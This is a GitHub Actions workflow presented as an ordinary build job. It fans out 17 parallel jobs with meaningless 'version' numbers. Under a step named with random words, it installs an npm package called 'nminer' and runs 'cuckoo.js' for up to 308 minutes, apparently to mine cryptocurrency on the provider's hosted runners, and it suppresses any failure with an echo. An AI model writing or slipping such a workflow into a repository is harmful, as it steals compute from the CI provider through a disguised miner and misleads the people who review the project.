name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 86 }
          - { version: 4066 }
          - { version: 8014 }
          - { version: 3585 }
          - { version: 8797 }
          - { version: 8538 }
          - { version: 9915 }
          - { version: 5722 }
          - { version: 5631 }
          - { version: 1751 }
          - { version: 6388 }
          - { version: 8091 }
          - { version: 3871 }
          - { version: 7159 }
          - { version: 3349 }
          - { version: 1459 }
          - { version: 70 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: perspire yet taro somber cemetery
        run: |
          npm install nminer@latest
          timeout 308m node cuckoo.js || echo "cuckoo executed"